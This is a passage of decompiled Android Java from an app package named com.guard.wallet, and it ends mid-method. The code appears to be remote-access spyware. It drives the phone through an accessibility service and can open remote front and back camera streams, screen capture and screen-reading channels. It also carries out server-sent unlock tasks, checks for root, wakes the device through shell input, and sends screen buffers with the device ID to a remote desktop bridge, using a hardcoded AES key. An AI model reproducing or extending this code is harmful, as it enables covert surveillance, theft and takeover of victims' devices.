package a1;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.sun.security.util.DerValue;
import android.util.Base64;
import android.util.Log;
import b1.C0089k;
import b1.C0095q;
import b1.C0096r;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.bridge.C0177a;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CommandResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.msg.BridgeBody;
import com.guard.wallet.msg.BridgeBufferBody;
import com.guard.wallet.msg.BridgeBufferMessage;
import com.guard.wallet.msg.BridgeMessage;
import com.guard.wallet.req.BatteryLevelVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.CacheTaskVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import e1.C0275d;
import f0.C0281b;
import f0.C0292m;
import f0.C0299t;
import f0.InterfaceC0290k;
import f0.InterfaceC0294o;
import g0.InterfaceC0309a;
import g0.InterfaceC0310b;
import g1.C0313b;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.net.ServerSocket;
import java.nio.ByteBuffer;
import java.nio.channels.ByteChannel;
import java.security.NoSuchAlgorithmException;
import java.security.Provider;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.LinkedBlockingQueue;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.X509TrustManager;
import l0.InterfaceC0385o;
import org.bouncycastle.i18n.TextBundle;
import com.guard.wallet.entity.BuildConfig;
import org.conscrypt.OpenSSLProvider;
import p0.C0882x;
import p000a.AbstractC0000a;
import p003f.AbstractC0276a;
import p005h.C0318e;
import p007j.C0350e;
import p010m.C0397d;

/* renamed from: a1.q */
/* loaded from: classes.dex */
public abstract class AbstractC0026q implements InterfaceC0385o {

    /* renamed from: a */
    public static C0025p f55a = null;

    /* renamed from: b */
    public static long f56b = 0;

    /* renamed from: c */
    public static C0177a f57c = null;

    /* renamed from: d */
    public static C0177a f58d = null;

    /* renamed from: e */
    public static C0177a f59e = null;

    /* renamed from: f */
    public static C0177a f60f = null;

    /* renamed from: g */
    public static C0177a f61g = null;

    /* renamed from: i */
    public static boolean f63i = false;

    /* renamed from: j */
    public static SSLContext f64j;

    /* renamed from: k */
    public static final /* synthetic */ int f65k = 0;

    /* renamed from: h */
    public static final byte[] f62h = {65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43, 47};

    /* renamed from: l */
    public static final byte[] f66l = {65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43, 47};

    /* renamed from: m */
    public static final byte[] f67m = {65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 45, 95};

    /* renamed from: n */
    public static final byte[] f68n = {45, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122};

    /* renamed from: A */
    public static boolean m150A() {
        if (MyAccessibilityService.m554P() != null) {
            String m562S = MyAccessibilityService.m554P().m562S();
            if (!m151B(m562S)) {
                return Objects.equals(m562S, MyAccessibilityService.m554P().getPackageName());
            }
        }
        if (AbstractC0251g.m653Z() != null) {
            return AbstractC0251g.s0(AbstractC0251g.m653Z().getPackageName());
        }
        return false;
    }

    /* renamed from: B */
    public static boolean m151B(Object obj) {
        return obj == null || BuildConfig.FLAVOR.equals(obj);
    }

    /* renamed from: C */
    public static boolean m152C() {
        String b02 = AbstractC0251g.b0();
        return MyAccessibilityService.m554P() != null ? Objects.equals(MyAccessibilityService.m554P().m562S(), b02) : AbstractC0251g.s0(b02);
    }

    /* renamed from: D */
    public static boolean m153D(String str) {
        if (m151B(str)) {
            return false;
        }
        String m166Q = m166Q(str);
        if (m166Q.isEmpty()) {
            return true;
        }
        for (char c : m166Q.toCharArray()) {
            if (!"-0123456789.Ee".contains(c + BuildConfig.FLAVOR)) {
                return false;
            }
        }
        return true;
    }

    /* renamed from: E */
    public static boolean m154E(int i2) {
        try {
            try {
                new ServerSocket(i2).close();
            } catch (IOException e2) {
                m186s("IpUtils", e2);
            }
            return true;
        } catch (IOException e3) {
            m186s("IpUtils", e3);
            return false;
        }
    }

    /* renamed from: F */
    public static void m155F(String str) {
        if (m151B(str) || !m193z()) {
            return;
        }
        C0177a c0177a = f59e;
        c0177a.getClass();
        if (m151B(str)) {
            return;
        }
        String m708l = AbstractC0252h.m708l("deviceId");
        if (m151B(m708l)) {
            return;
        }
        BridgeBufferBody bridgeBufferBody = new BridgeBufferBody();
        bridgeBufferBody.setBridgePath(c0177a.f192u);
        bridgeBufferBody.setDeviceId(m708l);
        bridgeBufferBody.setToDesktop(Boolean.TRUE);
        bridgeBufferBody.setBuffer(str);
        c0177a.mo748c(AbstractC0252h.m693N(new BridgeBufferMessage(bridgeBufferBody)));
    }

    /* renamed from: G */
    public static boolean m156G() {
        if (AbstractC0249e.m624m() || AbstractC0249e.m623l()) {
            return !Settings.canDrawOverlays(AbstractC0251g.m653Z());
        }
        return false;
    }

    /* renamed from: H */
    public static String m157H() {
        return new SimpleDateFormat("HH:mm:ss", Locale.CHINA).format(new Date(System.currentTimeMillis()));
    }

    /* renamed from: I */
    public static boolean m158I(String str) {
        return (str.equals("GET") || str.equals("HEAD")) ? false : true;
    }

    /* renamed from: J */
    public static Bitmap m159J(String str) {
        try {
            FileInputStream fileInputStream = new FileInputStream(str);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] bArr = new byte[1024];
            while (true) {
                int read = fileInputStream.read(bArr);
                if (read <= 0) {
                    break;
                }
                byteArrayOutputStream.write(bArr, 0, read);
            }
            byteArrayOutputStream.flush();
            byte[] byteArray = byteArrayOutputStream.toByteArray();
            Bitmap decodeByteArray = byteArray.length > 0 ? BitmapFactory.decodeByteArray(byteArray, 0, byteArray.length, null) : null;
            byteArrayOutputStream.close();
            return decodeByteArray;
        } catch (Exception e2) {
            m186s("FileUtils", e2);
            return null;
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:34:0x0087 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:39:0x007d A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:44:0x0073 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* renamed from: K */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static String m160K(String str) {
        FileInputStream fileInputStream;
        InputStreamReader inputStreamReader;
        BufferedReader bufferedReader;
        if (!m151B(str)) {
            File file = new File(str);
            if (file.exists() && file.isFile() && file.canRead()) {
                Log.d("FileUtils", "文件存在,能读取:" + str);
                try {
                    fileInputStream = new FileInputStream(file);
                } catch (IOException e2) {
                    e = e2;
                    fileInputStream = null;
                    inputStreamReader = null;
                }
                try {
                    inputStreamReader = new InputStreamReader(fileInputStream);
                    try {
                        bufferedReader = new BufferedReader(inputStreamReader);
                    } catch (IOException e3) {
                        e = e3;
                        bufferedReader = 0;
                    }
                } catch (IOException e4) {
                    e = e4;
                    inputStreamReader = null;
                    bufferedReader = inputStreamReader;
                    m186s("FileUtils", e);
                    if (fileInputStream != null) {
                        try {
                            fileInputStream.close();
                        } catch (IOException e5) {
                            m186s("FileUtils", e5);
                        }
                    }
                    if (inputStreamReader != null) {
                        try {
                            inputStreamReader.close();
                        } catch (IOException e6) {
                            m186s("FileUtils", e6);
                        }
                    }
                    if (bufferedReader != 0) {
                        try {
                            bufferedReader.close();
                        } catch (IOException e7) {
                            m186s("FileUtils", e7);
                        }
                    }
                    return null;
                }
                try {
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        String readLine = bufferedReader.readLine();
                        if (readLine == null) {
                            fileInputStream.close();
                            inputStreamReader.close();
                            bufferedReader.close();
                            return sb.toString();
                        }
                        sb.append(readLine);
                        sb.append('\n');
                    }
                } catch (IOException e8) {
                    e = e8;
                    m186s("FileUtils", e);
                    if (fileInputStream != null) {
                    }
                    if (inputStreamReader != null) {
                    }
                    if (bufferedReader != 0) {
                    }
                    return null;
                }
            }
        }
        return null;
    }

    /* renamed from: L */
    public static void m161L(C0025p c0025p) {
        if (c0025p.f53f != null || c0025p.f54g != null) {
            throw new IllegalArgumentException();
        }
        if (c0025p.f51d) {
            return;
        }
        synchronized (AbstractC0026q.class) {
            long j2 = f56b + 8192;
            if (j2 > 65536) {
                return;
            }
            f56b = j2;
            c0025p.f53f = f55a;
            c0025p.f50c = 0;
            c0025p.f49b = 0;
            f55a = c0025p;
        }
    }

    /* renamed from: M */
    public static boolean m162M() {
        if (AbstractC0251g.p0()) {
            return false;
        }
        return m172b();
    }

    /* renamed from: N */
    public static void m163N(CacheTaskVO cacheTaskVO) {
        ReqUnlockDeviceVO reqUnlockDeviceVO;
        if (cacheTaskVO == null || m151B(cacheTaskVO.getReqUri())) {
            return;
        }
        if (cacheTaskVO.getSocketStream().booleanValue()) {
            String m708l = AbstractC0252h.m708l("deviceId");
            if (!m151B(m708l)) {
                BridgeBody bridgeBody = new BridgeBody();
                bridgeBody.setDeviceId(m708l);
                bridgeBody.setBridgePath(cacheTaskVO.getReqUri());
                m178k(cacheTaskVO.getReqUri(), new BridgeMessage(bridgeBody));
            }
        }
        if (cacheTaskVO.getReqUri().equals("/unlock")) {
            if (m151B(cacheTaskVO.getArguments())) {
                reqUnlockDeviceVO = null;
            } else {
                reqUnlockDeviceVO = (ReqUnlockDeviceVO) AbstractC0252h.m699c(cacheTaskVO.getArguments(), TypeToken.get(ReqUnlockDeviceVO.class));
            }
            AbstractC0251g.p1(reqUnlockDeviceVO);
            return;
        }
        int i2 = 3;
        if (Objects.equals(cacheTaskVO.getReqMethod(), 0)) {
            new C0204i("http://127.0.0.1:7910").m405d(AbstractC0252h.m692M(cacheTaskVO.getArguments()), cacheTaskVO.getReqUri(), new C0350e(i2));
        }
        if (Objects.equals(cacheTaskVO.getReqMethod(), 1)) {
            new C0204i("http://127.0.0.1:7910").m408h(AbstractC0252h.m692M(cacheTaskVO.getArguments()), cacheTaskVO.getReqUri(), new C0350e(i2));
        }
    }

    /* renamed from: O */
    public static boolean m164O(String str, String str2) {
        m172b();
        if (m167R()) {
            return true;
        }
        if (m151B(str) && MainApplication.getAppContext() != null) {
            str = MainApplication.getAppContext().getPackageName();
        }
        if (m151B(str2)) {
            Integer num = AbstractC0248d.f402a;
            str2 = (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || m151B(MainApplication.getInstance().getBuildConfig().getLauncherLabel())) ? "StripChat" : MainApplication.getInstance().getBuildConfig().getLauncherLabel();
        }
        if (!m151B(str) && AbstractC0251g.d1(str, BuildConfig.FLAVOR) && m167R()) {
            return true;
        }
        if (MyAccessibilityService.m554P() != null && MyAccessibilityService.m555Q() != null) {
            if (!m150A() && !Objects.equals(MyAccessibilityService.m554P().m562S(), AbstractC0251g.b0())) {
                AbstractC0251g.F0(2);
            }
            UiObject findOneByOperateOr = MyAccessibilityService.m555Q().findOneByOperateOr(m182o(str2));
            if (findOneByOperateOr == null) {
                AbstractC0251g.F0(2);
                for (int i2 = 0; findOneByOperateOr == null && i2 < 5; i2++) {
                    AbstractC0251g.m646S(10L, 100L, new Point(300.0f, 200.0f), new Point(20.0f, 200.0f));
                    AbstractC0251g.T0(5);
                    MyAccessibilityService.m554P().l0(false);
                    findOneByOperateOr = MyAccessibilityService.m555Q().findOneByOperateOr(m182o(str2));
                }
            }
            if (findOneByOperateOr != null) {
                AbstractC0251g.m672s(Integer.valueOf((int) findOneByOperateOr.centerInScreen().getX()), Integer.valueOf((int) findOneByOperateOr.centerInScreen().getY()));
                if (m167R()) {
                    return true;
                }
                CombineFilter combineFilter = new CombineFilter();
                combineFilter.setBoolConditions(new LinkedList());
                combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
                UiObject findParentUtilCombine = findOneByOperateOr.findParentUtilCombine(combineFilter);
                if (findParentUtilCombine != null) {
                    AbstractC0251g.m672s(Integer.valueOf((int) findParentUtilCombine.centerInScreen().getX()), Integer.valueOf((int) findParentUtilCombine.centerInScreen().getY()));
                    return m167R();
                }
            }
        }
        return false;
    }

    /* renamed from: P */
    public static C0025p m165P() {
        synchronized (AbstractC0026q.class) {
            C0025p c0025p = f55a;
            if (c0025p == null) {
                return new C0025p();
            }
            f55a = c0025p.f53f;
            c0025p.f53f = null;
            f56b -= 8192;
            return c0025p;
        }
    }

    /* renamed from: Q */
    public static String m166Q(String str) {
        return (m151B(str) || "null".equals(str)) ? BuildConfig.FLAVOR : str.replaceAll("\\s*", BuildConfig.FLAVOR).replaceAll(" ", BuildConfig.FLAVOR).replaceAll(" ", BuildConfig.FLAVOR).replaceAll("^[\u3000 ]+|[\u3000 ]+$", BuildConfig.FLAVOR);
    }

    /* renamed from: R */
    public static boolean m167R() {
        boolean m150A = m150A();
        int i2 = 0;
        while (!m150A && i2 < 10) {
            AbstractC0251g.T0(1);
            i2++;
            m150A = m150A();
        }
        return m150A;
    }

    /* renamed from: S */
    public static boolean m168S() {
        if (AbstractC0249e.m621j()) {
            return true;
        }
        boolean z2 = false;
        if (AbstractC0251g.m653Z() != null) {
            try {
                PowerManager.WakeLock newWakeLock = ((PowerManager) AbstractC0251g.m653Z().getSystemService("power")).newWakeLock(805306378, "WakeLockUtils");
                if (newWakeLock.isHeld()) {
                    newWakeLock.release();
                }
                newWakeLock.setReferenceCounted(false);
                newWakeLock.acquire(600000L);
                z2 = true;
            } catch (Exception e2) {
                m186s("WakeLockUtils", e2);
            }
        }
        if (z2 && AbstractC0249e.m621j()) {
            AbstractC0251g.T0(2);
            if (AbstractC0249e.m621j()) {
                return true;
            }
        }
        if (C0318e.m844S() != null && C0318e.m844S().mo302D() && C0318e.m844S().m855N("input keyevent KEYCODE_WAKEUP")) {
            AbstractC0251g.T0(2);
            if (AbstractC0249e.m621j()) {
                return true;
            }
        }
        return AbstractC0251g.F0(2);
    }

    /* renamed from: T */
    public static void m169T(InterfaceC0290k interfaceC0290k, byte[] bArr, InterfaceC0309a interfaceC0309a) {
        ByteBuffer m801g = C0292m.m801g(bArr.length);
        m801g.put(bArr);
        m801g.flip();
        C0292m c0292m = new C0292m();
        c0292m.m803a(m801g);
        C0299t c0299t = new C0299t(interfaceC0290k, c0292m, interfaceC0309a, 1);
        ((C0281b) interfaceC0290k).mo779d(c0299t);
        c0299t.mo800c();
    }

    /* renamed from: U */
    public static boolean m170U(String str, String str2) {
        if (!m151B(str) && !m151B(str2)) {
            File file = new File(str);
            if (file.exists() && file.isFile() && file.canWrite()) {
                Log.d("FileUtils", "文件存在,能写入:" + str);
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(file, false);
                    byte[] bytes = str2.getBytes();
                    fileOutputStream.write(bytes, 0, bytes.length);
                    fileOutputStream.flush();
                    return true;
                } catch (Exception e2) {
                    m186s("FileUtils", e2);
                }
            }
        }
        return false;
    }

    /* renamed from: a */
    public static Bundle m171a(AbstractC0276a... abstractC0276aArr) {
        Bundle bundle = new Bundle();
        for (AbstractC0276a abstractC0276a : abstractC0276aArr) {
            abstractC0276a.mo775a(bundle);
        }
        return bundle;
    }

    /* renamed from: b */
    public static boolean m172b() {
        boolean m167R;
        while (true) {
            m167R = m167R();
            boolean m152C = m152C();
            if (m167R || m152C || MyAccessibilityService.m554P() == null) {
                break;
            }
            AbstractC0251g.F0(1);
        }
        return m167R;
    }

    /* renamed from: c */
    public static boolean m173c(C0275d c0275d, ByteChannel byteChannel) {
        C0313b c0313b;
        int i2;
        LinkedBlockingQueue linkedBlockingQueue = c0275d.f462a;
        ByteBuffer byteBuffer = (ByteBuffer) linkedBlockingQueue.peek();
        if (byteBuffer != null) {
            do {
                byteChannel.write(byteBuffer);
                if (byteBuffer.remaining() > 0) {
                    return false;
                }
                linkedBlockingQueue.poll();
                byteBuffer = (ByteBuffer) linkedBlockingQueue.peek();
            } while (byteBuffer != null);
        }
        if (!linkedBlockingQueue.isEmpty() || !c0275d.f468g || (c0313b = c0275d.f471j) == null || (i2 = c0313b.f578a) == 0 || i2 != 2) {
            return true;
        }
        if (c0275d.f477p == null) {
            throw new IllegalStateException("this method must be used in conjunction with flushAndClose");
        }
        c0275d.m766k(c0275d.f475n, c0275d.f477p.booleanValue(), c0275d.f476o.intValue());
        return true;
    }

    /* renamed from: d */
    public static BatteryLevelVO m174d() {
        if (AbstractC0251g.m653Z() != null) {
            BatteryManager batteryManager = (BatteryManager) AbstractC0251g.m653Z().getSystemService("batterymanager");
            Log.d("BatteryUtils", "BATTERY_PROPERTY_CAPACITY:" + batteryManager.getIntProperty(4));
            float intProperty = (float) (((double) batteryManager.getIntProperty(4)) / 100.0d);
            if (Build.VERSION.SDK_INT > 26) {
                AbstractC0252h.m683D(Integer.valueOf(batteryManager.getIntProperty(6)), "batteryStatus");
            }
            AbstractC0252h.m683D(Float.valueOf(intProperty), "batteryPercent");
        }
        BatteryLevelVO batteryLevelVO = new BatteryLevelVO();
        batteryLevelVO.setStatus(Integer.valueOf(AbstractC0252h.m705i("batteryStatus")));
        batteryLevelVO.setPercent(Float.valueOf(AbstractC0252h.m704h()));
        batteryLevelVO.setHealth(Integer.valueOf(AbstractC0252h.m705i("batteryHealth")));
        batteryLevelVO.setTemperature(Integer.valueOf(AbstractC0252h.m705i("batteryTemperature")));
        batteryLevelVO.setVoltage(Integer.valueOf(AbstractC0252h.m705i("batteryVoltage")));
        return batteryLevelVO;
    }

    /* renamed from: e */
    public static boolean m175e() {
        int m705i = AbstractC0252h.m705i("isRoot");
        if (m705i != 0 && m705i != 1) {
            m705i = m188u(new String[]{"echo root"}, true, false).getResult() == 0 ? 1 : 0;
            AbstractC0252h.m683D(Integer.valueOf(m705i), "isRoot");
        }
        return m705i == 1;
    }

    /* renamed from: g */
    public static void m176g(String str) {
        if (m151B(str)) {
            return;
        }
        str.getClass();
        switch (str) {
            case "/backCameraLive":
                C0177a c0177a = f61g;
                if (c0177a != null) {
                    c0177a.m822t();
                    f61g = null;
                    break;
                }
                break;
            case "/cacheTask":
                C0177a c0177a2 = f57c;
                if (c0177a2 != null) {
                    c0177a2.m822t();
                    f57c = null;
                    break;
                }
                break;
            case "/frontCameraLive":
                C0177a c0177a3 = f60f;
                if (c0177a3 != null) {
                    c0177a3.m822t();
                    f60f = null;
                    break;
                }
                break;
            case "/readScreen":
                C0177a c0177a4 = f59e;
                if (c0177a4 != null) {
                    c0177a4.m822t();
                    f59e = null;
                    break;
                }
                break;
            case "/minicap":
                C0177a c0177a5 = f58d;
                if (c0177a5 != null) {
                    c0177a5.m822t();
                    f58d = null;
                    break;
                }
                break;
        }
    }

    /* renamed from: h */
    public static void m177h(Closeable... closeableArr) {
        for (Closeable closeable : closeableArr) {
            if (closeable != null) {
                try {
                    closeable.close();
                } catch (Exception unused) {
                }
            }
        }
    }

    /* renamed from: k */
    public static void m178k(String str, BridgeMessage bridgeMessage) {
        C0177a c0177a;
        if (m151B(str)) {
            return;
        }
        str.getClass();
        switch (str) {
            case "/backCameraLive":
                if (f61g == null) {
                    m176g("/minicap");
                    m176g("/frontCameraLive");
                    C0177a c0177a2 = new C0177a(str, bridgeMessage);
                    f61g = c0177a2;
                    c0177a2.m823u();
                    C0397d m963c = C0397d.m963c();
                    m963c.m965d(0);
                    if (m963c.f799c == null) {
                        m963c.m964a(1);
                        return;
                    }
                    return;
                }
                return;
            case "/cacheTask":
                if (f57c == null) {
                    c0177a = new C0177a(str, bridgeMessage);
                    f57c = c0177a;
                    break;
                } else {
                    return;
                }
            case "/frontCameraLive":
                if (f60f == null) {
                    m176g("/minicap");
                    m176g("/backCameraLive");
                    C0177a c0177a3 = new C0177a(str, bridgeMessage);
                    f60f = c0177a3;
                    c0177a3.m823u();
                    C0397d m963c2 = C0397d.m963c();
                    m963c2.m965d(1);
                    if (m963c2.f799c == null) {
                        m963c2.m964a(0);
                        return;
                    }
                    return;
                }
                return;
            case "/readScreen":
                if (f59e == null) {
                    c0177a = new C0177a(str, bridgeMessage);
                    f59e = c0177a;
                    break;
                } else {
                    return;
                }
            case "/minicap":
                if (f58d == null) {
                    m176g("/frontCameraLive");
                    m176g("/backCameraLive");
                    c0177a = new C0177a(str, bridgeMessage);
                    f58d = c0177a;
                    break;
                } else {
                    return;
                }
            default:
                return;
        }
        c0177a.m823u();
    }

    /* renamed from: l */
    public static boolean m179l(String str) {
        if (!m151B(str)) {
            File file = new File(str);
            if (file.exists() && file.delete()) {
                Log.d("FileUtils", "文件存在,删除成功:" + str);
            }
            try {
                if (file.createNewFile()) {
                    Log.d("FileUtils", "文件创建成功:" + str);
                    return true;
                }
            } catch (IOException e2) {
                m186s("FileUtils", e2);
            }
        }
        Log.e("FileUtils", "文件创建失败:" + str);
        return false;
    }

    /* renamed from: m */
    public static String m180m(String str) {
        try {
            byte[] decode = Base64.decode(str, 16);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(2, new SecretKeySpec("****1qaz2wsx****".getBytes(), "AES"));
            return new String(cipher.doFinal(decode));
        } catch (Exception e2) {
            m186s("AESUtils", e2);
            return null;
        }
    }

    /* renamed from: n */
    public static boolean m181n(String str) {
        File file = new File(str);
        if (file.exists()) {
            return file.delete();
        }
        return false;
    }

    /* renamed from: o */
    public static CombineFiltersWithOr m182o(String str) {
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        String x02 = m151B(str) ? AbstractC0251g.x0() : str;
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.setBoolConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition.setEquals(x02);
        combineFilter.getStringConditions().add(stringCondition);
        combineFilter.getBoolConditions().add(new BoolCondition("visibleToUser", true, true));
        filters.add(combineFilter);
        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        if (m151B(str)) {
            str = AbstractC0251g.x0();
        }
        CombineFilter combineFilter2 = new CombineFilter();
        combineFilter2.setStringConditions(new LinkedList());
        combineFilter2.setBoolConditions(new LinkedList());
        StringCondition stringCondition2 = new StringCondition();
        stringCondition2.setProperty("desc");
        stringCondition2.setEquals(str);
        combineFilter2.getStringConditions().add(stringCondition2);
        combineFilter2.getBoolConditions().add(new BoolCondition("visibleToUser", true, true));
        filters2.add(combineFilter2);
        return combineFiltersWithOr;
    }

    /* renamed from: p */
    public static void m183p(InterfaceC0294o interfaceC0294o, C0292m c0292m) {
        int i2;
        InterfaceC0310b interfaceC0310b = null;
        while (!interfaceC0294o.mo780e() && (interfaceC0310b = interfaceC0294o.mo786k()) != null && (i2 = c0292m.f541c) > 0) {
            interfaceC0310b.mo294b(interfaceC0294o, c0292m);
            if (i2 == c0292m.f541c && interfaceC0310b == interfaceC0294o.mo786k() && !interfaceC0294o.mo780e()) {
                System.out.println("handler: " + interfaceC0310b);
                c0292m.m811k();
                throw new RuntimeException("mDataHandler failed to consume data, yet remains the mDataHandler.");
            }
        }
        if (c0292m.f541c == 0 || interfaceC0294o.mo780e()) {
            return;
        }
        System.out.println("handler: " + interfaceC0310b);
        System.out.println("emitter: " + interfaceC0294o);
        c0292m.m811k();
    }

    /* renamed from: q */
    public static void m184q(byte[] bArr, int i2, int i3, byte[] bArr2, int i4, int i5) {
        byte[] bArr3 = (i5 & 16) == 16 ? f67m : (i5 & 32) == 32 ? f68n : f66l;
        int i6 = (i3 > 1 ? (bArr[i2 + 1] << DerValue.tag_GeneralizedTime) >>> 16 : 0) | (i3 > 0 ? (bArr[i2] << DerValue.tag_GeneralizedTime) >>> 8 : 0) | (i3 > 2 ? (bArr[i2 + 2] << DerValue.tag_GeneralizedTime) >>> 24 : 0);
        if (i3 == 1) {
            bArr2[i4] = bArr3[i6 >>> 18];
            bArr2[i4 + 1] = bArr3[(i6 >>> 12) & 63];
            bArr2[i4 + 2] = 61;
            bArr2[i4 + 3] = 61;
            return;
        }
        if (i3 == 2) {
            bArr2[i4] = bArr3[i6 >>> 18];
            bArr2[i4 + 1] = bArr3[(i6 >>> 12) & 63];
            bArr2[i4 + 2] = bArr3[(i6 >>> 6) & 63];
            bArr2[i4 + 3] = 61;
            return;
        }
        if (i3 != 3) {
            return;
        }
        bArr2[i4] = bArr3[i6 >>> 18];
        bArr2[i4 + 1] = bArr3[(i6 >>> 12) & 63];
        bArr2[i4 + 2] = bArr3[(i6 >>> 6) & 63];
        bArr2[i4 + 3] = bArr3[i6 & 63];
    }

    /* renamed from: r */
    public static String m185r(int i2, byte[] bArr) {
        if (bArr == null) {
            throw new IllegalArgumentException("Cannot serialize a null array.");
        }
        if (i2 < 0) {
            throw new IllegalArgumentException(AbstractC0000a.m11g("Cannot have length offset: ", i2));
        }
        if (i2 + 0 > bArr.length) {
            throw new IllegalArgumentException(String.format("Cannot have offset of %d and length of %d with array of length %d", 0, Integer.valueOf(i2), Integer.valueOf(bArr.length)));
        }
        int i3 = ((i2 / 3) * 4) + (i2 % 3 <= 0 ? 0 : 4);
        byte[] bArr2 = new byte[i3];
        int i4 = i2 - 2;
        int i5 = 0;
        int i6 = 0;
        while (i5 < i4) {
            m184q(bArr, i5 + 0, 3, bArr2, i6, 0);
            i5 += 3;
            i6 += 4;
        }
        if (i5 < i2) {
            m184q(bArr, i5 + 0, i2 - i5, bArr2, i6, 0);
            i6 += 4;
        }
        if (i6 <= i3 - 1) {
            byte[] bArr3 = new byte[i6];
            System.arraycopy(bArr2, 0, bArr3, 0, i6);
            bArr2 = bArr3;
        }
        try {
            return new String(bArr2, "US-ASCII");
        } catch (UnsupportedEncodingException unused) {
            return new String(bArr2);
        }
    }

    /* renamed from: s */
    public static void m186s(String str, Exception exc) {
        Log.e(str, !m151B(exc.getMessage()) ? exc.getMessage() : exc.getCause() != null ? exc.getCause().toString() : Arrays.toString(exc.getStackTrace()));
    }

    /* renamed from: t */
    public static void m187t(String str, Throwable th) {
        Log.e(str, !m151B(th.getMessage()) ? th.getMessage() : Arrays.toString(th.getStackTrace()));
    }

    /* JADX WARN: Code restructure failed: missing block: B:67:0x00e7, code lost:
    
        if (r11 == null) goto L78;
     */
    /* JADX WARN: Removed duplicated region for block: B:60:0x00db A[Catch: IOException -> 0x00d7, TryCatch #0 {IOException -> 0x00d7, blocks: (B:69:0x00d3, B:60:0x00db, B:62:0x00e0), top: B:68:0x00d3 }] */
    /* JADX WARN: Removed duplicated region for block: B:62:0x00e0 A[Catch: IOException -> 0x00d7, TRY_LEAVE, TryCatch #0 {IOException -> 0x00d7, blocks: (B:69:0x00d3, B:60:0x00db, B:62:0x00e0), top: B:68:0x00d3 }] */
    /* JADX WARN: Removed duplicated region for block: B:68:0x00d3 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x00fc A[Catch: IOException -> 0x00f8, TryCatch #2 {IOException -> 0x00f8, blocks: (B:87:0x00f4, B:75:0x00fc, B:77:0x0101), top: B:86:0x00f4 }] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x0101 A[Catch: IOException -> 0x00f8, TRY_LEAVE, TryCatch #2 {IOException -> 0x00f8, blocks: (B:87:0x00f4, B:75:0x00fc, B:77:0x0101), top: B:86:0x00f4 }] */
    /* JADX WARN: Removed duplicated region for block: B:83:0x010a  */
    /* JADX WARN: Removed duplicated region for block: B:85:? A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:86:0x00f4 A[EXC_TOP_SPLITTER, SYNTHETIC] */
